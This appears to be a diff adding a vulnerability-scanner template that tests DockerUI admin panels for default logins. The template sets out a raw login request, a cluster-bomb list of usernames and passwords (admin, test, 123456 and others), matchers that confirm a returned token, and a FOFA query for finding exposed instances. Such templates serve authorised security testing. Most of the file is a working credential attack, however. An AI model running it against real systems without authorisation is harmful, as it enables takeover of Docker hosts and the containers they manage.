@@ -1,0 +1,53 @@
+id: docker-ui-default-login
+
+info:
+  name: docker ui - Default Login
+  author: leadlife
+  severity: high
+  description: DockerUI是一款开源的、强大的、轻量级的Docker管理工具。DockerUI覆盖了 docker cli 命令行 95% 以上的命令功能，通过可视化的界面，即使是不熟悉docker命令的用户也可以非常方便的进行Docker和Docker Swarm集群进行管理和维护。
+  reference:
+    - https://github.com/wy876/POC/blob/main/DockerUI/DockerUI%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 12
+    fofa-query: body="static/common/js/ui.js"
+  tags: docker,docker-ui,default-login
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 63
+        Authorization: Basic d2ViQXBwOndlYkFwcA==
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+        Accept: application/json, text/javascript, */*; q=0.01
+        uid: 
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/login.html
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh,ja;q=0.9
+        Connection: keep-alive
+
+        username={{username}}&grant_type=password&password={{password}}&practicetype=
+    
+    attack: clusterbomb
+    payloads:
+      username:
+        - 'ginghan'
+        - 'admin'
+        - 'test'
+      password:
+        - '123456'
+        - 'admin'
+        - 'test'
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'msg','ok','token','userid')
+          - contains(header,'Docker-UIManager')
+        condition: and
